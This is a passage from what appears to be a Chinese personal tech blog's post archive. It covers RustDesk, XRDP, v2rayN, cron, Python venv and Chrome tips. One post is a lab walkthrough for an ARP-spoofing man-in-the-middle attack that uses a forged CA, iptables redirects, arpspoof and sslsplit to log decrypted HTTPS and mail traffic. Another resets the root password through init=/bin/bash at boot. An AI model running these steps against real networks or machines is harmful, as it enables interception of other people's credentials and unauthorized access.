class="string">hbbr</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">hbbr:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21117</span><span class="string">:21117</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21119</span><span class="string">:21119</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbr</span> <span class="string">-k</span> <span class="string">_</span> <span class="comment"># 加上-k _ </span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbr:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>实测加上<code>-k _</code>参数后，会导致无法连接，不确定是不是BUG，有解决的小伙伴欢迎在评论区留言交流！</p>
</blockquote>
<p>如果要更改key，请删除 <code>id_ed25519</code> 和 <code>id_ed25519.pub</code> 文件并重新启动 hbbs&#x2F;hbbr，hbbs将会产生新的密钥对。</p>
<h4 id="把配置放在可执行文件名里-Windows-only"><a href="#把配置放在可执行文件名里-Windows-only" class="headerlink" title="把配置放在可执行文件名里 (Windows only)"></a>把配置放在可执行文件名里 (Windows only)</h4><p>把<code>rustdesk.exe</code> 修改为 rustdesk-<code>host=&lt;host-ip-or-name&gt;,key=&lt;public-key-string&gt;</code>.exe, 例如： rustdesk-<code>host=192.168.1.137,key=xfdsfsd32=32</code>.exe，你可以在About窗口看到配置结果，如下图所示。</p>
<p><code>host</code> 和 <code>key</code> 都需要添加，缺少一个就不好使。</p>
<blockquote>
<p>如果密钥中有无效字符而不能用于文件名，请删除<code>id_ed25519</code>文件并重新启动hbbs&#x2F;hbbr，<code>id_ed25519.pub</code>文件将被重新生成，请重复操作直到获得有效字符。</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">Menu</th>
<th align="left">About Page</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://rustdesk.com/docs/en/self-host/install/images/aboutmenu.png"><img src="/img/rustdesk/19.webp" alt="img"></a></td>
<td align="left"><a href="https://rustdesk.com/docs/en/self-host/install/images/lic.png"><img src="/img/rustdesk/17.webp" alt="img"></a></td>
</tr>
</tbody></table>
<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>祝大家用得开心，有问题可以去GitHub提<a href="https://github.com/rustdesk/rustdesk-server/issues">Issues</a>，也可以在评论区互相交流探讨。</p>
<p>同时，有能力给项目做贡献的同学，也欢迎积极加入到<a href="https://github.com/rustdesk">项目</a>中来，贡献自己的一份力量！</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/rustdesk/rustdesk-server">https://github.com/rustdesk/rustdesk-server</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
        <tag>rustdesk</tag>
      </tags>
  </entry>
  <entry>
    <title>windows远程访问ubuntu服务器桌面，安装XRDP远程桌面</title>
    <url>/posts/b69b7f1c/</url>
    <content><![CDATA[<p>执行命令：</p>
<p>用root用户登录vps </p>
<p>如何创建root用户： </p>
<p>步骤1： 给root用户设置密码： </p>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<p>输入密码，并确认密码。 </p>
<p>步骤2： 重新输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>

<p>然后输入密码： 发现可以切换到root权限了。 </p>
<p>如何切换到root用户： </p>
<p>步骤1： 重新输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>

<p>然后输入密码： 发现可以切换到root权限了。</p>
<p>添加新用户 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adduser noss </span><br><span class="line"><span class="comment">#noss为新添加的用户名</span></span><br></pre></td></tr></table></figure>

<p>安装 Ubuntu 图形用户界面 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update -y </span><br><span class="line"></span><br><span class="line">sudo apt install ubuntu-desktop -y</span><br></pre></td></tr></table></figure>

<p>安装和配置 RDP 服务器 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install xrdp -y </span><br><span class="line"></span><br><span class="line">sudo systemctl status xrdp </span><br><span class="line"></span><br><span class="line">sudo vim /etc/xrdp/xrdp.ini </span><br></pre></td></tr></table></figure>

<p>修改： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">port=tcp://:3389</span><br></pre></td></tr></table></figure>



<hr>
<p>启动RDP服务 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart xrdp</span><br></pre></td></tr></table></figure>

<p>在防火墙上打开 RDP 端口（如果有防火墙） </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 3389</span><br></pre></td></tr></table></figure>

<p>安装chrome 浏览器 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install chromium-browser</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>linux安装和配置v2rayn</title>
    <url>/posts/3c4072e6/</url>
    <content><![CDATA[<p>v2rayN下载：<a href="https://github.com/2dust/v2rayN/releases">Releases · 2dust&#x2F;v2rayN</a></p>
<p>添加执行权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x v2rayN</span><br></pre></td></tr></table></figure>

<p>启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./v2rayN</span><br></pre></td></tr></table></figure>

<p>tun模式启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ./v2rayN</span><br></pre></td></tr></table></figure>

<p>桌面图标启动</p>
<p>在桌面文件夹，下创建v2rayN.desktop文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> v2rayN.desktop</span><br></pre></td></tr></table></figure>

<p>编辑如下配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Version=1.0</span><br><span class="line">Name=v2rayN</span><br><span class="line">Comment=一款稳定的桌面代理客户端软件</span><br><span class="line">Exec=v2rayN文件路径</span><br><span class="line">Icon=v2rayN图标路径</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=Utility;</span><br></pre></td></tr></table></figure>

<p>添加执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x v2rayN.desktop</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>proxy</category>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>proxy</tag>
        <tag>linux</tag>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>linux中的cron如何设置和管理</title>
    <url>/posts/5743d22f/</url>
    <content><![CDATA[<p>在Kali Linux中，可以使用crontab命令来设置和管理Cron作业。以下是一些常用的操作：</p>
<p>查看当前用户的Cron作业列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>

<p>编辑当前用户的Cron作业：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>

<p>这将打开一个文本编辑器，您可以在其中编写和编辑Cron作业。每行表示一个Cron作业，格式为：分钟 小时 日 月 周 命令。</p>
<p>删除当前用户的Cron作业：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure>

<p>添加一个新的Cron作业：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>

<p>然后在文本编辑器中添加新的Cron作业。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano  <span class="comment">#编辑器 </span></span><br><span class="line"></span><br><span class="line">ctrl+x <span class="comment">#退出保存</span></span><br></pre></td></tr></table></figure>

<p>查看系统中所有用户的Cron作业：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>

<p>执行Cron作业： Cron作业将在指定的时间自动执行，您无需手动执行。您可以在**&#x2F;var&#x2F;log&#x2F;syslog**中查看Cron作业的执行情况。</p>
<p>查看Cron服务状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service cron status</span><br></pre></td></tr></table></figure>

<p>通过以上方法，您可以设置和管理Kali Linux中的Cron作业。请注意，对于某些敏感任务，建议谨慎设置Cron作业，以免造成系统问题。</p>
<p>例子：</p>
<p>每天11：12执行shell自动化脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">12 11 * * * /bin/bash path/to/xxx.sh</span><br></pre></td></tr></table></figure>

<p>每月的第一天凌晨4点同步数据到远程服务器</p>
<p>如果我们需要每月的第一天凌晨4点将数据同步到远程服务器，可以在<code>crontab</code>文件中添加如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0 4 1 * * rsync -avz /data/ user@remote-server:/data/</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>kali实现开机root权限</title>
    <url>/posts/3e38cd7e/</url>
    <content><![CDATA[<h2 id="一、新版介绍"><a href="#一、新版介绍" class="headerlink" title="一、新版介绍"></a><strong>一、新版介绍</strong></h2><p>Kali默认不是以root管理员身份运行的，有时候像我这样的懒人每次都要sudo su提升权限，就很麻烦。所以这里我介绍一种在Kali中完美以root权限执行的方法。</p>
<h2 id="二、实验步骤"><a href="#二、实验步骤" class="headerlink" title="二、实验步骤"></a><strong>二、实验步骤</strong></h2><p>查看您的Kali是否处于root权限，$为普通用户 #为root模式。</p>
<p><img src="/img/kaliroot/1.webp"></p>
<p><img src="/img/kaliroot/2.webp"></p>
<p>接下来我们开始进行配置，首先重启kali进而配置单用户模式，输入命令：reboot，重启。</p>
<p>在如下图所示的页面按住字母e键，进入如下图所示的页面进行配置。</p>
<p><img src="/img/kaliroot/3.webp"></p>
<p><img src="/img/kaliroot/4.webp"></p>
<blockquote>
<p>更改配置文件，在linux这一行，将ro改为rw，在splash后空一格，添加命令：init&#x3D;&#x2F;bin&#x2F;bash,如下图所示。</p>
</blockquote>
<p><img src="/img/kaliroot/5.webp"></p>
<p>配置完上图的页面后，按住f10进入以下单用户页面，如下图所示，回车继续。</p>
<p>系统进入单用户的命令行模式</p>
<p><img src="/img/kaliroot/6.webp"></p>
<p><strong>更改root（管理员用户）用户密码，如下图所示。</strong></p>
<p><strong>命令：passwd root</strong></p>
<p><strong>New password:</strong></p>
<p><strong>Retype new password:</strong></p>
<p><img src="/img/kaliroot/7.webp"></p>
<p>最后重启客户端，用root用户登录就好了。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>解决linux无法使用drissionpage库打开chrome的问题</title>
    <url>/posts/42310953/</url>
    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DrissionPage <span class="keyword">import</span> ChromiumPage</span><br><span class="line"><span class="keyword">from</span> DrissionPage <span class="keyword">import</span> ChromiumOptions</span><br><span class="line"><span class="keyword">from</span> DrissionPage.easy_set <span class="keyword">import</span> set_headless, set_paths</span><br><span class="line">set_headless(<span class="literal">True</span>)  <span class="comment">#无头模式，隐藏浏览器运行</span></span><br><span class="line"></span><br><span class="line">co = ChromiumOptions()</span><br><span class="line">co.set_paths(browser_path=<span class="string">r&#x27;/usr/bin/google-chrome&#x27;</span>)  <span class="comment">#注意chrome的执行文件位置</span></span><br><span class="line"><span class="comment">#co.set_argument(&#x27;--incognito&#x27;)   #可有可无，未知用法</span></span><br><span class="line">co.set_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)   <span class="comment">#linux要加入这一行代码</span></span><br><span class="line"></span><br><span class="line">page = ChromiumPage(co)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux安装pythonvenv环境</title>
    <url>/posts/f717803c/</url>
    <content><![CDATA[<p>在Kali Linux系统中，Python venv是一个非常有用的工具，可以帮助用户在虚拟环境中独立安装和管理Python包。本文将介绍如何在Kali Linux系统上安装Python venv环境，并演示如何使用它来创建和管理虚拟环境。</p>
<h3 id="步骤一：安装Python-venv"><a href="#步骤一：安装Python-venv" class="headerlink" title="步骤一：安装Python venv"></a>步骤一：安装Python venv</h3><p>首先，确保你的Kali Linux系统已经安装了Python。如果尚未安装Python，可以使用以下命令安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3</span><br></pre></td></tr></table></figure>

<p>一旦Python安装完成，你可以安装Python venv模块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-venv</span><br></pre></td></tr></table></figure>

<h3 id="步骤二：创建虚拟环境"><a href="#步骤二：创建虚拟环境" class="headerlink" title="步骤二：创建虚拟环境"></a>步骤二：创建虚拟环境</h3><p>接下来，我们将演示如何在Kali Linux系统上创建一个名为<code>myenv</code>的新虚拟环境。请按照以下步骤操作：</p>
<p>首先，创建一个新目录来存储虚拟环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> myenv</span><br><span class="line"><span class="built_in">cd</span> myenv</span><br></pre></td></tr></table></figure>

<p>然后，在该目录中创建一个名为<code>venv</code>的虚拟环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m venv venv</span><br></pre></td></tr></table></figure>

<p>激活虚拟环境，：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者cd到venv/bin的位置去activate</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>激活虚拟环境后，你会注意到终端提示符前会显示<code>(venv)</code>，表示当前已经进入了虚拟环境。</p>
</blockquote>
<h3 id="步骤三：使用虚拟环境"><a href="#步骤三：使用虚拟环境" class="headerlink" title="步骤三：使用虚拟环境"></a>步骤三：使用虚拟环境</h3><p>一旦虚拟环境已经激活，你可以在其中安装和管理Python包。例如，我们可以使用<a href="https://edu.51cto.com/lesson/970202.html?utm_platform=pc&utm_medium=51cto&utm_source=shequ&utm_content=bk_article_keyword#pip">pip</a>在虚拟环境中安装一个名为<code>requests</code>的包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure>

<p>如果你想退出虚拟环境，只需运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过本文的介绍，你已经学会了在Kali Linux系统上安装和使用Python venv环境的方法。使用虚拟环境可以帮助你更好地管理Python包，避免不必要的冲突。希望这篇文章对你有所帮助！</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>coding</category>
        <category>centos</category>
        <category>debian</category>
        <category>python3</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>coding</tag>
        <tag>linux</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title>chrome和edge浏览器进阶设置</title>
    <url>/posts/1601f0a/</url>
    <content><![CDATA[<p>Chrome浏览器进阶设置，一套提升谷歌浏览器整体使用体验的解决方案，全方位设置谷歌浏览器，实现提升网页打开速度|提升下载速度，真正发挥出谷歌浏览器应有的样子！</p>
<h1 id="1、关闭安全搜索"><a href="#1、关闭安全搜索" class="headerlink" title="1、关闭安全搜索"></a>1、关闭安全搜索</h1><ul>
<li><p>打开google.com——点击右下角的设置——点击搜索设置——点击安全搜索——选择关闭</p>
</li>
<li><p>浏览器选项中提示“<strong>由贵单位管理</strong>”解决方案</p>
<ul>
<li>谷歌 <code>Chrome</code> 浏览器地址栏输入 <code>Chrome://policy</code> ，即可看到调用企业策略的第三方软件或者是用户主动安装的第三方扩展等。</li>
<li>Windows系统按WIN+R输入“regedit”运行注册表管理</li>
<li>删除注册表\HKEY_CURRENT_USER\Software\Policies\Google\Chrome\下对应的文件夹（删除整个Chrome目录）<ul>
<li>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome（<strong>如果上面的目录找不到，用这个</strong>）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="2、提升网页打开速度"><a href="#2、提升网页打开速度" class="headerlink" title="2、提升网页打开速度"></a>2、提升网页打开速度</h1><ul>
<li><p>关闭使用安全DNS（所谓的安全DNS，也就是加密DNS，启用后有大概率导致打开网页缓慢）</p>
<ul>
<li>设置——点击隐私和安全——关闭使用安全DNS（此功能如果有需要，可以开启）</li>
</ul>
</li>
<li><p>设置——性能——开启预加载——选择扩展型预加载&#x2F;标准预加载（本操作会占用内存，根据自己电脑配置来选择）</p>
<ul>
<li>优点：<ul>
<li>加快网页加载速度。</li>
<li>减少了等待时间，体验更加流畅。</li>
<li>提前进行 DNS 解析和链接预取，浏览器可以减少网络延迟，在某些网络环境中有助于提升页面响应速度。</li>
<li>减少因为网络波动或其他问题导致的加载失败，提升页面的可靠性。</li>
</ul>
</li>
<li>缺点：<ul>
<li>增加流量消耗。</li>
<li>占用内存和 CPU 资源，打开标签页时间越长，占用资源越多。</li>
<li>占用大量缓存空间，导致缓存快速填满。</li>
</ul>
</li>
</ul>
</li>
<li><p>设置——点击系统——开启硬件加速（根据自己电脑配置来选择，一般情况下选择开启）</p>
<ul>
<li>优点：<ul>
<li>显著提升浏览器的渲染速度，使网页滚动和动画更流畅，视频播放更加顺畅。</li>
<li>降低 CPU 负载，减少卡顿。</li>
</ul>
</li>
<li>缺点：<ul>
<li>增加 GPU 占用</li>
<li>增加显卡功耗</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>开启前面两个功能的情况下，注意关闭未使用的标签页，打开的标签页越多，Chrome 的运行速度就越慢。</strong></p>
</li>
</ul>
<h1 id="3、安全设置"><a href="#3、安全设置" class="headerlink" title="3、安全设置"></a>3、安全设置</h1><ul>
<li><p>启用密码管理</p>
<ul>
<li>点击右上角三个小点——点击密码和自动填充——点击Google密码管理工具——点击设置——启用提示保存密码和通行密钥和自动登录</li>
</ul>
</li>
<li><p>启用安全浏览</p>
<ul>
<li>设置——点击隐私和安全——选择标准保护——启用一律使用安全连接</li>
</ul>
</li>
</ul>
<h1 id="4、开启Chrome实验室功能"><a href="#4、开启Chrome实验室功能" class="headerlink" title="4、开启Chrome实验室功能"></a>4、开启Chrome实验室功能</h1><ul>
<li>打开chrome:&#x2F;&#x2F;flags&#x2F;页面<ul>
<li>Experimental QUIC protocol：启用QUIC协议，可以提高网页加载速度，尤其在网络延迟较高时。</li>
<li>GPU rasterization：启用GPU光栅化，可以提高图形渲染性能，尤其在处理图形密集型的网站时。</li>
<li>Smooth Scrolling：启用平滑滚动，可以改善网页滚动体验，使之更加流畅。</li>
<li>Parallel downloading：启用并行下载以加快下载速度。</li>
<li>Overlay Scrollbars：自动收起滚动条。</li>
</ul>
</li>
</ul>
<h1 id="5、安装扩展提升浏览体验"><a href="#5、安装扩展提升浏览体验" class="headerlink" title="5、安装扩展提升浏览体验"></a>5、安装扩展提升浏览体验</h1><ul>
<li>点击右上角三个小点——点击扩展程序——点击访问Chrome应用商店<ul>
<li><a href="https://chromewebstore.google.com/detail/adguard-%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AA%E5%99%A8/bgnkhhnnamicmpeenaelnjfhikgbkllg?hl=zh-CN&utm_source=ext_sidebar">AdGuard 广告拦截器</a></li>
<li><a href="https://chromewebstore.google.com/detail/%E7%AF%A1%E6%94%B9%E7%8C%B4/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN&utm_source=ext_sidebar">Tampermonkey</a>（下载脚本常用）</li>
<li><a href="https://chromewebstore.google.com/detail/%E6%B8%85%E6%B4%81%E5%B7%A5-%E5%88%A0%E9%99%A4cookie%E5%92%8C%E7%BC%93%E5%AD%98/ogfjgagnmkiigilnoiabkbbajinanlbn?utm_source=ext_app_menu">清洁工 – 删除cookie和缓存</a>（配合前面的设置使用）</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>web</category>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>利用sslsplit+arpspoof实现arp欺骗</title>
    <url>/posts/ec393b70/</url>
    <content><![CDATA[<p>准备</p>
<blockquote>
<p>一台win7虚拟机，IP：192.168.88.130   默认网关：192.168.88.2</p>
<p>一台kali虚拟机，IP：192.168.88.129</p>
</blockquote>
<p>SSLsplit 是一个针对 SSL&#x2F;TLS 加密的网络连接进行攻击，为网络取证和渗透测试的工具。它会终止 SSL &#x2F; TLS 和启动一个新的连接到原来的目的地，记录所有传输的数据。它支持普通的 TCP 和 SSL，HTTP 和 HTTPS，和 IPv4 和 IPv6。http不做介绍仅仅实现代理功能，ssl实现代理的同时要与服务器建立连接，同时伪造证书与客户端建立连接，即双连接，依据获取的client信息再与服务器通信，从而实现明文数据监听。</p>
<h1 id="1、利用openssl生成证书私钥"><a href="#1、利用openssl生成证书私钥" class="headerlink" title="1、利用openssl生成证书私钥"></a>1、利用openssl生成证书私钥</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br></pre></td></tr></table></figure>

<h1 id="2、利用私钥签名生成证书"><a href="#2、利用私钥签名生成证书" class="headerlink" title="2、利用私钥签名生成证书"></a>2、利用私钥签名生成证书</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure>


<p>在目录下生成ca.key私钥文件和ca.crt证书文件</p>
<h1 id="3、开启路由转发功能"><a href="#3、开启路由转发功能" class="headerlink" title="3、开启路由转发功能"></a>3、开启路由转发功能</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/net/ipv4/ip_forward</span><br><span class="line">1             <span class="comment">#屏幕输出1，说明开启成功</span></span><br></pre></td></tr></table></figure>

<h1 id="4、设置iptables端口转发规则"><a href="#4、设置iptables端口转发规则" class="headerlink" title="4、设置iptables端口转发规则"></a>4、设置iptables端口转发规则</h1><h2 id="1、清空当前表规则："><a href="#1、清空当前表规则：" class="headerlink" title="1、清空当前表规则："></a>1、清空当前表规则：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -F  </span><br></pre></td></tr></table></figure>

<h2 id="2、设置iptables端口转发规则："><a href="#2、设置iptables端口转发规则：" class="headerlink" title="2、设置iptables端口转发规则："></a>2、设置iptables端口转发规则：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080　【<span class="comment">#HTTP】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443 【<span class="comment">#HTTPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 【<span class="comment">#MSA】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 【<span class="comment">#SMTPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 【<span class="comment">#IMAPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 【<span class="comment">#POP3S】</span></span><br></pre></td></tr></table></figure>

<p>（-t:指定表;-A PERROUTING:路由前生效;-p:指定协议;–dport:接受流量的端口;-j:指定处理方法（REDIRECT重定向）;–to-ports:转发端口）</p>
<h2 id="3、使用该命令显示所有刚才配置的规则："><a href="#3、使用该命令显示所有刚才配置的规则：" class="headerlink" title="3、使用该命令显示所有刚才配置的规则："></a>3、使用该命令显示所有刚才配置的规则：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure>

<h1 id="5、-Arp欺骗-，截获目标主机的网络流量"><a href="#5、-Arp欺骗-，截获目标主机的网络流量" class="headerlink" title="5、 Arp欺骗 ，截获目标主机的网络流量"></a>5、 Arp欺骗 ，截获目标主机的网络流量</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arpspoof -i eth0 -t 目标IP -r 目标主机网关</span><br><span class="line">arpspoof -i eth0 -t 192.168.88.130 -r 192.168.88.2</span><br></pre></td></tr></table></figure>

<h1 id="6、启动SSLsplit进行攻击"><a href="#6、启动SSLsplit进行攻击" class="headerlink" title="6、启动SSLsplit进行攻击"></a>6、启动SSLsplit进行攻击</h1><h2 id="1、创建目录"><a href="#1、创建目录" class="headerlink" title="1、创建目录"></a>1、创建目录</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="built_in">test</span>/logdir</span><br></pre></td></tr></table></figure>

<h2 id="2、侦听设定的端口"><a href="#2、侦听设定的端口" class="headerlink" title="2、侦听设定的端口"></a>2、侦听设定的端口</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sslsplit -D -l connect.log -j /root/test -S /root/test/logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure>


<p>根目录下出现一个test文件夹 </p>
<p>伪造成功后，目标机访问https的网站，会出现“安全证书有问题的错误”，点击继续访问后，访问信息被记录在connect.log中，且在test&#x2F;logdir可查看传输数据</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常用解压与压缩命令</title>
    <url>/posts/8e8fbaa2/</url>
    <content><![CDATA[<h1 id="tar-文件"><a href="#tar-文件" class="headerlink" title=".tar 文件"></a>.tar 文件</h1><p>仅打包，并非压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xvf FileName.tar         <span class="comment"># 解包 </span></span><br><span class="line"></span><br><span class="line">tar -cvf FileName.tar DirName <span class="comment"># 将DirName和其下所有文件（夹）打包</span></span><br></pre></td></tr></table></figure>

<h1 id="gz文件"><a href="#gz文件" class="headerlink" title=".gz文件"></a>.gz文件</h1><p>.gz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gunzip FileName.gz  <span class="comment"># 解压1 </span></span><br><span class="line"></span><br><span class="line">gzip -d FileName.gz <span class="comment"># 解压2 </span></span><br><span class="line"></span><br><span class="line">gzip FileName       <span class="comment"># 压缩，只能压缩文件</span></span><br></pre></td></tr></table></figure>

<h1 id="tar-gz文件和-tgz文件"><a href="#tar-gz文件和-tgz文件" class="headerlink" title=".tar.gz文件和.tgz文件"></a>.tar.gz文件和.tgz文件</h1><p>.tar.gz 和 .tgz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf FileName.tar.gz               <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">tar -zcvf FileName.tar.gz DirName       <span class="comment"># 将DirName和其下所有文件（夹）压缩 </span></span><br><span class="line"></span><br><span class="line">tar -C DesDirName -zxvf FileName.tar.gz <span class="comment"># 解压到目标路径</span></span><br></pre></td></tr></table></figure>

<h1 id="zip文件"><a href="#zip文件" class="headerlink" title=".zip文件"></a>.zip文件</h1><p>感觉.zip占用空间比.tar.gz大</p>
